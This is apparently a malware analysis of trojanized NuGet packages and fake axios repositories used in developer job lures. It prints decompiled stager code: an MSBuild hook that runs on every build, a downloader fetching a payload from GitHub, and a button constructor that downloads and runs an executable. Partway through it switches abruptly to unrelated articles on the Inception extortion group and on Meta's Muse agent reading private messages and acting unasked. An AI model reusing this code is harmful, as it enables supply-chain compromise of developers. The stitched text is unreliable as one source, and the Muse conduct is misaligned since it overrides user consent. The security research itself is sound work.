NuGet automatically imports a package’s build/<package_id>.targets file into every project that references the package. NuGet matches that file name case-insensitively, so VS_Builder.MsBuildAnalyzer.targets loads for the package ID VS_Builder.MSBuildAnalyzer. The targets file in the lure’s 1.2.7 package is identical (SHA-256 33510d8e48c26279c0c212b4e6e5f95b7f0a116061eae7f50241f81903be5b6b) to the build/VS_Builder.MsBuildAnalyzer.targets that VS_Builder.MSBuildAnalyzer 1.1.3 shipped on NuGet.

Its first target fails the build unless the project’s target framework starts with net8.0-windows or equals net10.0. The second target runs the stager:

<Target Name="ExecuteInlineCSharpTarget" AfterTargets="Build" Condition="'$(TargetFramework)' == 'net10.0' OR $(TargetFramework.StartsWith('net8.0-windows'))" Inputs="$(MSBuildProjectFullPath)" Outputs="$(TargetDir)ForceExecuteNonExistenFile.txt"> <PropertyGroup> <_AnalyzerLibFolder Condition="$(TargetFramework.StartsWith('net8.0-windows'))">net8.0</_AnalyzerLibFolder> <_AnalyzerLibFolder Condition="'$(TargetFramework)' == 'net10.0'">net10.0</_AnalyzerLibFolder> </PropertyGroup> <Exec Command="dotnet "$(MSBuildThisFileDirectory)..\lib\$(_AnalyzerLibFolder)\MSBuildAnalyzer.dll"" WorkingDirectory="$(TargetDir)" IgnoreExitCode="true" ContinueOnError="true"> <Output TaskParameter="ExitCode" PropertyName="_AnalyzerExitCode" /> </Exec> </Target>

ExecuteInlineCSharpTarget runs after Build and launches dotnet on MSBuildAnalyzer.dll from the package’s own lib folder. Its Outputs value names ForceExecuteNonExistenFile.txt, a file that nothing creates, so MSBuild never treats the target as up to date and runs it on every build. IgnoreExitCode and ContinueOnError keep a failure in this step from failing the build.

The Stager Hides a Download Behind Decoy Build Analysis

MSBuildAnalyzer.dll describes itself as an “MSBuild Compatibility Analyzer” and lists “Microsoft” as its company. Its entry point wraps everything in an empty catch. The pipeline first makes 17 decoy calls that parse a hard-coded build log, check toolset and SDK versions, and list the local NuGet package cache without using the result. It then does the real work, shown here from the decompiled BuildPipeline class:

_executor.Execute("InitializeToolset", delegate { byte[] toolset = LoadToolsetManifest(); byte[] config = LoadSolutionConfig(); PropertyOverrideEngine.ApplyBuildPropertyOverride(toolset, config); string outputPath = ResolveProjectOutputPath(toolset, config); string emitPath = ResolveArtifactEmitPath(); _executor.Execute("RestorePackages", delegate { try { byte[] payload = PackageFeedResolver.RestorePackageArtifact(outputPath); ArtifactEmitter.EmitBuildArtifact(emitPath, payload); ReplicateSystemDiagnosticHost(); } catch { } }); });

LoadToolsetManifest and LoadSolutionConfig rebuild a key and an encrypted blob from 8-character Base64 fragments spread across classes named ToolsetRegistry, SolutionConfig and PlatformConfig. The blob is XORed with the key and then decrypted with AES-256-CBC under the same key. The file paths use the same scheme with their own fragment arrays. Decrypting all four values statically produces:

https://raw[.]githubusercontent[.]com/stevenleedig-ux/fantastic-giggle/main/src/demos/SPGO/build.docker osk/OskSupport.dll System32\osk.exe osk\osk.exe

The stager downloads that URL with a default HttpClient and writes the bytes to %LOCALAPPDATA%\osk\OskSupport.dll:

internal static byte[] RestorePackageArtifact(string feedLocation) { using HttpClient httpClient = new HttpClient(); return httpClient.GetByteArrayAsync(feedLocation).GetAwaiter().GetResult(); }

It then copies the Windows On-Screen Keyboard into the same folder:

string path = ResolvePathManifest(_diagnosticHostSourceKeyFragment, _diagnosticHostSourceDataFragment); string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), path); if (!File.Exists(text)) { return false; } string path2 = ResolvePathManifest(_diagnosticHostTargetKeyFragment, _diagnosticHostTargetDataFragment); string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), path2); string directoryName = Path.GetDirectoryName(text2); if (!string.IsNullOrEmpty(directoryName) && !Directory.Exists(directoryName)) { Directory.CreateDirectory(directoryName); } if (File.Exists(text2)) { FileInfo fileInfo = new FileInfo(text); FileInfo fileInfo2 = new FileInfo(text2); if (fileInfo.Length == fileInfo2.Length && fileInfo.LastWriteTimeUtc == fileInfo2.LastWriteTimeUtc) { return true; } } File.Copy(text, text2, overwrite: true);

The stager never runs anything it writes. The repository named in that URL, stevenleedig-ux/fantastic-giggle, returned HTTP 404 during our analysis, so the file it served is unknown. HappyOne.MSBuildAnalyzer 1.2.9, the NuGet package the lure later switched to, ships the same targets file content (identical SHA-256) as build/HappyOne.MsBuildAnalyzer.targets and a rebuilt lib/net8.0/MSBuildAnalyzer.dll of the same size.

FileButton Starts the Copied osk.exe

The second lure package, VS_Builder.WinUI3Controls 1.0.7, names “Microsoft” as its author and describes a button that routes clicks to Windows files and folders. Its FileButton does that when clicked, and it is the control the README asks candidates to style. The constructor also ends by calling TryInitializeEnvironmentCompatibilityProbe(), right after it wires up the click handler. That method starts the probe target:

private void TryInitializeEnvironmentCompatibilityProbe() { if (_environmentProbeExecuted) { return; } _environmentProbeExecuted = true; if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) { return; } try { string text = ResolveEnvironmentProbeTarget(); if (!string.IsNullOrWhiteSpace(text) && File.Exists(text)) { if (IsEnvironmentProbeActive(text)) { WriteDiagnosticLog("[Environment Probe Skipped] An active probe instance was detected. Duplicate launch suppressed.", "Info"); return; } Process.Start(new ProcessStartInfo { FileName = text, UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden }); WriteDiagnosticLog("[Environment Probe Initialized] Compatibility probe launched successfully.", "Info"); }

The launch target is rebuilt from fragment arrays with the same Base64, XOR and AES-256-CBC scheme the stager uses:

private static readonly string[] _environmentProbeKeyFragment = new string[6] { "NKz0WUpm", "4uBA9fcO", "8xN+xj87", "Ngke7RXP", "pHuflllg", "juk=" }; private static readonly string[] _environmentProbeDataFragment = new string[6] { "Cfkat+8b", "QxS3w6TZ", "HTo1CZJP", "Bc3qCGOq", "as+xamPH", "8JY=" };

These decrypt to osk/osk.exe, which the control joins to %LOCALAPPDATA%. A static flag limits the launch to the first FileButton created in the process, a process check skips it when that exact path is already running, and the window is hidden. The WriteDiagnosticLog calls build their messages and discard them, so the “logging” is cosmetic. The control’s default tooltip templates are Korean strings meaning “Open folder” and “Run file”, a language artifact rather than an attribution signal.

HijackLibs lists osk.exe as a Windows executable that, when copied to a user-writable folder next to a malicious osksupport.dll, runs that DLL’s code through the legitimate program. That is the layout the two packages create. We did not test the side-load, and whether a copied osk.exe starts from %LOCALAPPDATA%\osk on current Windows builds remains an open question.

Neither package works alone. The build-time package only stages files, and the runtime control only launches a file that must already exist. A candidate who builds the project and then runs it, as the README requires, triggers both halves.

The Lure Worked Around a NuGet Takedown

The VS_Builder account published VS_Builder.MSBuildAnalyzer 1.0.1 without a targets file on November 2, added the first build hook in 1.0.2 about ten minutes later, and followed with 1.0.8, 1.1.2, 1.1.3 and VS_Builder.WinUI3Controls 1.0.6 the same day. NuGet unlisted all of them at 20:15 UTC and deleted them at 23:57 UTC on November 2.

About 39 hours later, HappyOne published HappyOne.MSBuildAnalyzer 1.2.8. That version still carried the targets file under its old name, build/VS_Builder.MsBuildAnalyzer.targets, which NuGet does not import for the new package ID. Version 1.2.9 fixed the name 26 minutes later. Twelve minutes after that, commit 9e9384a moved the lure from its bundled packages to HappyOne.MSBuildAnalyzer 1.2.9 and HappyOne.WinUI3Controls 1.0.9 on NuGet.

Commit 9e9384a swaps the bundled VS_Builder packages for HappyOne packages from NuGet.

The final commit, 0bb379c at 17:15 UTC, keeps only HappyOne.WinUI3Controls 1.1.0, published eight minutes earlier, and removes DisableFastUpToDateCheck. We could not determine what version 1.1.0 or HappyOne.MSBuildAnalyzer 1.3.0 do. NuGet unlisted and deleted every HappyOne package on November 6, so the lure no longer restores as committed, but its first two commits carry the bundled 1.2.7 and 1.0.7 packages.

WinUI.Button Downloads and Runs an Executable From Its Constructor #

WinUI.Button 1.0.0 was published on September 2, 2026, by Carol-White-Super. At the time of writing, it remains listed and installable, with about 160 downloads according to the NuGet search API. Download counts include mirrors and scanners and are not victim counts.

In the decompiled WinUI.Button 1.0.0, the WUIButton constructor starts a background routine that downloads avast.exe from Carol-White-Super/cloud with an embedded GitHub token, saves it as Launcher.exe and runs it.

The package metadata describes a harmless control:

<id>WinUI.Button</id> <version>1.0.0</version> <authors>Carol-White-Super</authors> <description>A beautiful and customizable Button control for WinUI 3 applications.</description> <tags>WinUI WinUI3 Button Control XAML WindowsAppSDK</tags> <repository type="git" />

Most of WinUI.Button.dll is a working calculator key with Number, Operator, Function and Equal styles. The decompiled constructor adds one thing:

public WUIButton() { Core m_core = new Core(); Task.Run(() => m_core.Init()); }

WinUI creates controls through the generated XAML type provider, so placing a WUIButton in XAML markup is enough to run the constructor:

private object Activate_0_WUIButton() { return new WUIButton(); }

Nothing runs at install or build time. The code runs when an application that uses the control opens a window containing it. Downloader.Core.Init first takes a named mutex, so the downloader runs once per process and in only one process at a time:

private readonly string owner = "Carol-White-Super"; private readonly string repo = "cloud"; private readonly string path = "db"; private readonly string branch = "Main"; private static Mutex appMutex; public async Task Init() { string name = "Global\\MyUniqueApplicationGuid-12345"; appMutex = new Mutex(initiallyOwned: true, name, out var createdNew); if (!createdNew) { return; } string githubApiUrl = $"https://api.github.com/repos/{owner}/{repo}/contents/{path}/avast.exe?ref={branch}"; string savePath = Path.Combine(Path.GetTempPath(), "Launcher.exe");

The request authenticates with a 93-character fine-grained GitHub token stored in plain text in the DLL (github_p(redacted), SHA-256 9bc1be99462f89880e1e22d9d3ade01cbbfe8bae54a27125e0129542f92ce93f) and asks the GitHub contents API for the raw file:

using HttpClient client = new HttpClient(); client.Timeout = TimeSpan.FromSeconds(30.0); client.DefaultRequestHeaders.UserAgent.ParseAdd("MyUpdater"); client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token); client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/vnd.github.raw")); using (HttpResponseMessage response = await client.GetAsync(githubApiUrl)) { response.EnsureSuccessStatusCode(); using FileStream fs = new FileStream(savePath, FileMode.Create, FileAccess.Write, FileShare.None); await response.Content.CopyToAsync(fs); } downloaded = true;

Every exception is swallowed. After a failure, the loop waits one to four seconds and tries again with no retry limit. The file is then started through the Windows shell unless a process with the same path is already running:

if (!downloaded) { await Task.Delay(TimeSpan.FromSeconds((double)random.Next(1, 5))); } if (File.Exists(savePath)) { break; } } } try { if (!IsApplicationRunning(savePath)) { Process.Start(new ProcessStartInfo { FileName = savePath, UseShellExecute = true }); } }

On later launches of the same app, the download is skipped and Launcher.exe is started again if it is not running. The only secret this code sends is the threat actor’s own token, to the GitHub API, and it collects no victim data itself. The GitHub account Carol-White-Super returned 404 during our analysis, so the second stage, avast.exe, is unrecoverable. With the account gone, an app built with the control keeps sending authenticated requests to the GitHub API every few seconds while it runs. We did not use the embedded token.

A public GitHub repository created on September 5, three days after the package was published, contains a WinUI 3 calculator that references WinUI.Button 1.0.0, pins the exact SDK versions the package depends on, and builds its keypad from 24 WUIButton controls. We could not determine whether the repository belongs to the threat actor or to a targeted developer, so we do not name it.

Windows Executables Disguised as axios Project Files #

Two GitHub repositories, jason-code-super/axios (created on July 23, 2026, 78 seconds after its account) and stevenleedig-ux/axios-http (created on August 10 by the account that owns the lure), are threat actor copies of the axios JavaScript library renamed axios-test-one. Both serve a Windows executable at lib/env/axios.csproj, a name that looks like part of a .NET project.

Both lib/env/axios.csproj files begin with the MZ header and DOS stub of a Windows executable rather than MSBuild XML.

Both repositories started with the same file at lib/env/axios.exe, an unmodified, Microsoft-signed copy of Sysinternals Autoruns 13.96 used as a placeholder. In stevenleedig-ux/axios-http it was renamed to axios.csproj in a single commit, and in jason-code-super/axios it was deleted and uploaded again under the new name. The threat actor then swapped payloads through GitHub’s web interface. Besides the placeholder, the history of the two repositories holds nine binaries:

jason-code-super/axios: a loader whose export directory is named msedgewebview2.exe (July 24), two builds of a PyInstaller Chrome profile stealer (August 1, each removed within 90 minutes), and two builds of a loader named updater.exe (August 4). At the time of writing, the repository serves the second updater.exe.

stevenleedig-ux/axios-http: a payload whose build path names it WeapF (August 10), followed by three Themida-protected builds (August 27 to September 2). At the time of writing, it serves the last Themida build.

The commit history of stevenleedig-ux/axios-http shows axios.exe renamed to axios.csproj on August 10, 2026, followed by four delete and re-upload cycles through September 2.

The July and August HappyOne packages are deleted from NuGet, but their publication times track these repositories. RevertButtonIcon 1.0.1 appeared 72 minutes after axios.csproj first appeared in jason-code-super/axios, and WindowsAccentColorName and SetButtonColor were published 20 and 52 minutes after the timestamp of the first commit in stevenleedig-ux/axios-http. We treat that as timing evidence only.

asdnbvHKJF&^*DSFKJEfasdljfa;! <https://api>[.]github[.]com/repos/James-White-Super/React_prj/contents/react-burger/public ID: %s\r\nUsername: %s\r\nExternal: %s\r\nHostname: %s\r\nOS: %s(%s)\r\nMACAddress: %s\r\nRAM: %s\r\nStorage: %s

Before any network traffic, the loader checks its environment. The checks must finish within 2,000 milliseconds, and the loader stops if the machine has less than 4 GiB of RAM or less than 60 GiB of disk, reports a VMware, Xen, Hyper-V, KVM, QEMU or VirtualBox hypervisor, carries virtual machine drivers, or has analysis tools such as Wireshark, Process Monitor, x64dbg, Ghidra, IDA Pro or Burp Suite installed. The first updater.exe build also waits five minutes before its first network request; the second build drops that delay.

The loader then confirms internet access through Google’s generate_204 endpoint, looks up its external IP address through api.ipify.org, and talks to the GitHub contents API with an embedded fine-grained token:

It requests <victim ID>/log1.dat under the C2 path. If GitHub answers 404, it creates that file with the commit message downloading new version. The file holds the host profile from the template above, Base64-encoded but not encrypted, with its ID derived in part from the Windows MachineGuid.

It requests <victim ID>/log2.dat. If that file exists, the loader downloads its content through the download_url that GitHub returns, takes the first 16 bytes as the IV and decrypts the rest with AES-256-CBC under the SHA-256 hash of the passphrase.

Otherwise it waits 10 seconds and starts over.

It maps the decrypted PE file in memory, calls its exported Start function, and deletes itself with a batch file.

Each new victim appears as a folder in the C2 repository, and the threat actor can stage a different payload for each one. GitHub requests use a Chrome Client Hints string as the User-Agent, and the WinHTTP session is named CppHttp/1.0. The C2 repository returns 404 to unauthenticated requests, and we did not use the token.

The July msedgewebview2.exe build is an earlier version of the same loader with a different string encoding (Base64 with each character shifted up or down by one), a different C2 repository, James-Tran-Dev/teris, and fewer anti-analysis checks. The same binary was hosted as lib/env/axios-telemetry.json in a third repository, figma-share/axios-http, two days before it appeared in jason-code-super/axios.

A Chrome Profile Stealer That Uploads to GitHub

The two August 1 builds are PyInstaller programs built with Python 3.14 and three custom modules, vss, backup and github_upload. Their module strings show the flow. Hidden PowerShell creates a Volume Shadow Copy through the WMI Win32_ShadowCopy class. The stealer then collects the Chrome User Data folders whose names start with Profile, plus the files at the top level of User Data, zips them, splits the archives into .part files and uploads each part with a GitHub contents API PUT and the commit message Backup <name>. The destination is gabsantosbus-star/EngineeringRepository, a repository under the lure-authoring account described below, reached with a classic GitHub token (ghp_nkZZ(redacted)). The second build adds timestamped, per-user folders.

In Chrome’s standard layout, those folders hold saved logins, cookies, history and extension data, and the top-level Local State file holds the key that protects saved passwords and cookies. No Default string appears in the stealer’s main script, so Chrome’s default profile may be skipped, and creating a shadow copy normally requires administrator rights.

WeapF Reports to Telegram Behind a Fake Microsoft Signature

The August 10 payload in stevenleedig-ux/axios-http carries the build path D:\Work\Codes\WeapF\x64\Release\Payload.pdb and an Authenticode signature from a self-signed certificate whose subject and issuer are both CN=Microsoft Windows Publisher. The signature matches the file but chains to no trusted root. Its strings are assembled on the stack and XORed with 0x55.

The program checks for a debugger, enumerates processes, sleeps for one minute or one hour depending on a branch, and adds itself to HKCU\Software\Microsoft\Windows\CurrentVersion\Run. It then fetches an AES-GCM-encrypted configuration from the README.md of the GitHub repository jeksifjeksjejcks/test, which supplies the JSON fields tg and url, and reports the computer name, user name, time zone and CPU model through the Telegram Bot API sendMessage method. Its User-Agent is a garbled browser string containing AppleWevKit/537.36 (KHTM@. Strings for a C:\Windows\System32\winrse.exe drop path, a hidden PowerShell self-removal command and a rundll32.exe shell32.dll,ShellExec_RunDLL launch are present, but we did not trace their use. The configuration repository returns 404, so the bot token and follow-on payload are unknown.

The same payload, identical apart from seven bytes in its PE header and the signature appended to the signed copy, is embedded in an LGA.exe from an earlier lure (described below) that was uploaded the day before the signed copy appeared in stevenleedig-ux/axios-http. The behavior of the three later Themida builds cannot be recovered statically.

A Trojanized Wallet Analyzer Carries a New Loader Build #

On November 13, 2026, gabsantosbus-star, the GitHub account behind the shared lure-authoring identity (described below), published a GitHub release of “Crypto Wallet Analyzer”, a single-file .NET app. The README presents the app as a first-stage client deliverable that inventories eight crypto wallet extensions in Chrome profiles and makes no network requests. The visible app does only that, but its decompiled MainWindow constructor also loads a native DLL bundled in the executable:

string lpFileName = FindBundledDll("vcruntime146_cor2.dll"); _dllHandle = LoadLibrary(lpFileName); if (_dllHandle == IntPtr.Zero) { throw new Win32Exception(Marshal.GetLastWin32Error(), "Self-contained error"); }

The DLL’s name imitates the WPF runtime’s vcruntime140_cor3.dll, and the app’s dependency manifest does not list it. The DLL starts a background thread when loaded, and closing the window only hides it, so the process keeps running.

The DLL is a new build of the GitHub C2 loader described above, with the export-directory name dropper_dll.dll and a single export, JSON_OBJECT. Its strings are encoded with an affine mod-127 scheme instead of Base64 and XOR, but they decode to the same log1.dat and log2.dat paths, downloading new version commit message and CppHttp/1.0 agent, plus a new payload key passphrase and a new C2 repository, Best-Seller-Dev/dexTrader, reached through the GitHub contents API with an embedded fine-grained token. The Best-Seller-Dev account returned 404 during our analysis, so the next stage is unknown, and we did not use the token.

We found one place where this lure was advertised. On November 7, a client account created two days earlier on LaborX, a freelance marketplace that pays in cryptocurrency, posted an $8,500 to $10,000 job for a C# WPF “Crypto Wallet Analyzer” whose requirements include delivering complete source code through GitHub at each development stage. LaborX’s Telegram channel promoted the job on November 9. The client profile uses the real company brand from the lead-generation lure described below, and the job describes the same app, a read-only inventory of installed wallet software.

npm First, Then NuGet

ThoSuperstarDev is the former name of figma-share. Their three npm accounts, gsanbus, jasonsayman and jasonsuperstar, use the email addresses of Gabriel, figma-share and jason-code-super, respectively. All six were gone from npm by July 23. Title: Inception - possibly a ShinyHunters reboot - claims seven victims in a week
Context: “While this threat cluster has changed their brand affiliation, the operators remain active in targeting organizations with voice phishing attacks and account takeovers...
Full Text: Don't mind the recent arrests. The ShinyHunters extortion gang may still be operating, just under the new name of Inception, according to Okta's threat intelligence group. ShinyHunters is the brash cybercriminal group that, most recently, breached rival gang Clop before hacking the FBI, resulting in at least three arrests of key suspects in September and October. The crims - and their old data leak site - have since gone dark. “While this threat cluster has changed their brand affiliation, the operators remain active in targeting organizations with voice phishing attacks and account takeovers resulting in data theft and extortion,” Okta threat hunters Moussa Diallo and Katie Nickels said on Monday. Okta tracks this threat cluster as O-UNC-053 - the “O-UNC” prefix stands for an Okta Uncategorized cluster, and it uses this label before formally attributing the activity to a named threat group. While Okta hasn't formally confirmed O-UNC-053 to be the same crime crew as ShinyHunters, the identity and access management provider’s researchers note that it does use nearly identical social engineering tactics: voice phishing, during which the scammers trick targets into entering credentials into phishing pages and approving multi-factor authentication (MFA). Plus, they note: O-UNC-053 operators change the themes of their phishing domains about every four to six weeks, and they also post claimed victims on ShinyHunters’ data leak site. In November, however, organizations targeted by O-UNC-053 began appearing on a new data leak site branded as Inception and not ShinyHunters. The first five - Advanced Micro Devices, Cigna Healthcare, Paychex, PepsiCo, and Henry Schein - appeared November 17 on the site, and all were marked “leaked.” Soon after, security maven Dominic Alvieri questioned if Inception was linked to ShinyHunters. “ShinyHunters are not all in jail,” he wrote on social media. On November 19, AutoZone appeared on the site, with Inception again claiming to have leaked the auto-parts retailer's files. On Saturday, EV technology firm Lucid Group joined the claimed victims. None of the seven companies have confirmed breaches, and none responded to The Register’s inquiries. We will update this story when we receive more information. Okta Threat Intelligence “is unable to validate if published data is authentic,” the researchers said in response to our questions. In the Monday report, the Okta team does note that Inception’s new data leak site listings “included multiple targets for which Okta Threat Intelligence previously observed O-UNC-053 infrastructure registration.” The infrastructure was registered between six and 19 days before Inception listed the companies on its leak site, and this gap “is consistent with prior shifts from Com-affiliated actors,” Diallo and Nickels added. The Com (short for community) is a loosely knit network of online groups whose young members participate in a range of illicit activities including hacking, swatting, digital extortion, real-life shootings, and other physical violence. Many security researchers consider ShinyHunters to be connected to The Com, along with groups such as Scattered Spider and LAPSUS$, with overlapping memberships and shared infrastructure. “Before and after the change in DLS publication, O-UNC-053 maintained consistent infrastructure and TTPs, leading us to assess that the cluster has very likely changed their brand affiliation,” the Okta researchers wrote. “We cannot currently make a high confidence assessment as to whether O-UNC-053 is operating the DLS themselves or is partnering with another extortion actor.” Regardless, members of the group formerly known as ShinyHunters and/or O-UNC-053 are still roaming the internet, looking for new victims, and conducting voice phishing attacks to steal data and then extort victims' companies for exorbitant sums of money. Consider yourself warned - and turn on phishing-resistant MFA.®

In this article

Meta’s AI agent, Muse, reportedly flagged a private Signal message an employee said she hadn’t given it access to

A Meta team member said built-in prompts to engage users triggered hallucinations

Check your AI agent’s permissions, especially whether it can read notifications from other apps

Internal posts reviewed by Reuters describe Meta’s AI agent Muse surfacing private information unprompted, and Reuters’ own tests backed up part of the story.

Reuters reviewed more than two dozen internal Meta posts. One employee said Muse reminded her to answer a Signal message from her sister. The employee wrote that she did “not grant it access to other apps.” Another post described a stray note quoting bank balances. ZDNET adds that Muse booked an Airbnb nobody asked for.

A Meta Superintelligence team member said the hallucinations were triggered by built-in prompts meant to re-engage users between sessions. He told Fortune the prompts

“bias towards the most uncomfortable topics, like finances, security, and safety.”

Meta says Muse only accesses data users have given it permission to access. It calls the examples “isolated incidents” and says many were hallucinations that have been fixed.

Signal President Meredith Whittaker called deploying agents with this much device access “technologically reckless.” She wants a consistent way for apps to mark themselves off-limits to agents, and for operating systems to enforce it.

Signal has also begun restricting screenshots to block agents, but experts note this doesn’t stop an AI agent from reading notifications on Android.

Apple recently changed macOS to restrict accessibility tools and add agent-specific permissions. Google said it is considering changes. Meanwhile, major banks, United Airlines, and other companies are blocking or have announced they’ll block AI agents from acting on behalf of their users.

The customers most affected by United’s new policy are those who use agentic AI like Meta’s Muse. Since its launch in September, Muse has been downloaded more than 10 million times, becoming one of the fastest-growing apps ever. It’s also key to Meta’s plan to generate billions of dollars in revenue from AI.

How to stay safe

You can limit the exposure, mostly by checking permissions. Granting notification or accessibility access can expose other apps on your device, not just the one you had in mind. So, there are a few things you can check:

Audit notification access on Android. Go to Settings > Notifications > Device & app notifications (the path may vary by phone) and switch off notification access for any AI agent.

Check Mac permissions. Update macOS first, since Apple has already restricted this route. Then remove AI agents from Accessibility and Screen Recording, and review Full Disk Access.

Hide message previews. Turn off notification content for sensitive apps like Signal and your banking apps.

Don’t grant access during setup unless you need it. Think through what permissions that app needs.

Keep the agent away from money. Don’t link payment methods or banking apps. You should be the one deciding when it’s time to pay.

Uninstall AI agents that you don’t trust or that overstep your boundaries.

Scammers know more about you than you think.
